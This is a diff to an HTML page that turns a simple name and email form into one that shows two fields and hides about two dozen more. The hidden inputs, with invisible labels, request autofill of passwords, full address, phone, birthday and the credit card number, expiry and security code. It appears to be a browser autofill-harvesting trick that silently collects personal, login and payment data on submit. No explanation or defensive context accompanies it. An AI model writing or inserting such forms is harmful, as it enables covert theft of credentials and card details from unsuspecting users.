@@ -17,14 +17,98 @@
 <body>
 
     <form id="myForm">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name"><br><br>
-        
-        <label for="email">Email:</label>
-        <input type="hidden" id="email" name="email"><br><br>
-        
-        <label for="age">Age:</label>
-        <input type="number" id="age" name="age"><br><br>
+      <label for="name">Full Name:</label>
+      <input type="text" id="name" name="name" autocomplete="name"><br>
+      
+      <label for="given-name" style="display:none;">First Name:</label>
+      <input type="hidden" id="given-name" name="given-name" autocomplete="given-name"><br>
+      
+      <label for="additional-name" style="display:none;">Middle Name:</label>
+      <input type="hidden" id="additional-name" name="additional-name" autocomplete="additional-name"><br>
+      
+      <label for="family-name" style="display:none;">Last Name:</label>
+      <input type="hidden" id="family-name" name="family-name" autocomplete="family-name"><br>
+      
+      <label for="nickname" style="display:none;">Nickname:</label>
+      <input type="hidden" id="nickname" name="nickname" autocomplete="nickname"><br>
+      
+      <label for="gender" style="display:none;">Gender:</label>
+      <input type="hidden" id="gender" name="gender" autocomplete="sex"><br>
+      
+      <label for="bday" style="display:none;">Date of Birth:</label>
+      <input type="hidden" id="bday" name="bday" autocomplete="bday"><br>
+      
+      <!-- Contact Information -->
+      <label for="email">Email Address:</label>
+      <input type="email" id="email" name="email" autocomplete="email"><br>
+      
+      <label for="phone" style="display:none;">Phone Number:</label>
+      <input type="hidden" id="phone" name="phone" autocomplete="tel"><br>
+      
+      <!-- Address Information -->
+      <label for="street-address" style="display:none;">Street Address:</label>
+      <input type="hidden" id="street-address" name="street-address" autocomplete="street-address"><br>
+      
+      <label for="address-line1" style="display:none;">Address Line 1:</label>
+      <input type="hidden" id="address-line1" name="address-line1" autocomplete="address-line1"><br>
+      
+      <label for="address-line2" style="display:none;">Address Line 2:</label>
+      <input type="hidden" id="address-line2" name="address-line2" autocomplete="address-line2"><br>
+      
+      <label for="address-level2" style="display:none;">City:</label>
+      <input type="hidden" id="address-level2" name="address-level2" autocomplete="address-level2"><br>
+      
+      <label for="address-level1" style="display:none;">State/Province:</label>
+      <input type="hidden" id="address-level1" name="address-level1" autocomplete="address-level1"><br>
+      
+      <label for="postal-code" style="display:none;">Postal Code:</label>
+      <input type="hidden" id="postal-code" name="postal-code" autocomplete="postal-code"><br>
+      
+      <label for="country" style="display:none;">Country Code:</label>
+      <input type="hidden" id="country" name="country" autocomplete="country"><br>
+      
+      <label for="country-name" style="display:none;">Country Name:</label>
+      <input type="hidden" id="country-name" name="country-name" autocomplete="country-name"><br>
+      
+      <!-- Organization Details -->
+      <label for="organization" style="display:none;">Company Name:</label>
+      <input type="hidden" id="organization" name="organization" autocomplete="organization"><br>
+      
+      <label for="job-title" style="display:none;">Job Title:</label>
+      <input type="hidden" id="job-title" name="job-title" autocomplete="organization-title"><br>
+      
+      <!-- Login Credentials -->
+      <label for="username" style="display:none;">Username:</label>
+      <input type="hidden" id="username" name="username" autocomplete="username"><br>
+      
+      <label for="password" style="display:none;">Password:</label>
+      <input type="hidden" id="password" name="password" autocomplete="current-password"><br>
+      
+      <!-- Payment Information -->
+      <label for="cc-name" style="display:none;">Credit Card Name:</label>
+      <input type="hidden" id="cc-name" name="cc-name" autocomplete="cc-name"><br>
+      
+      <label for="cc-number" style="display:none;">Credit Card Number:</label>
+      <input type="hidden" id="cc-number" name="cc-number" autocomplete="cc-number"><br>
+      
+      <label for="cc-exp" style="display:none;">Credit Card Expiration Date:</label>
+      <input type="hidden" id="cc-exp" name="cc-exp" autocomplete="cc-exp"><br>
+      
+      <label for="cc-csc" style="display:none;">Credit Card Security Code:</label>
+      <input type="hidden" id="cc-csc" name="cc-csc" autocomplete="cc-csc"><br>
+      
+      <!-- Additional Information -->
+      <label for="url" style="display:none;">Website URL:</label>
+      <input type="hidden" id="url" name="url" autocomplete="url"><br>
+      
+      <label for="photo" style="display:none;">Photo URL:</label>
+      <input type="hidden" id="photo" name="photo" autocomplete="photo"><br>
+      
+      <label for="language" style="display:none;">Language:</label>
+      <input type="hidden" id="language" name="language" autocomplete="language"><br>
+      
+
+
         
         <input type="submit" value="Submit">
     </form>
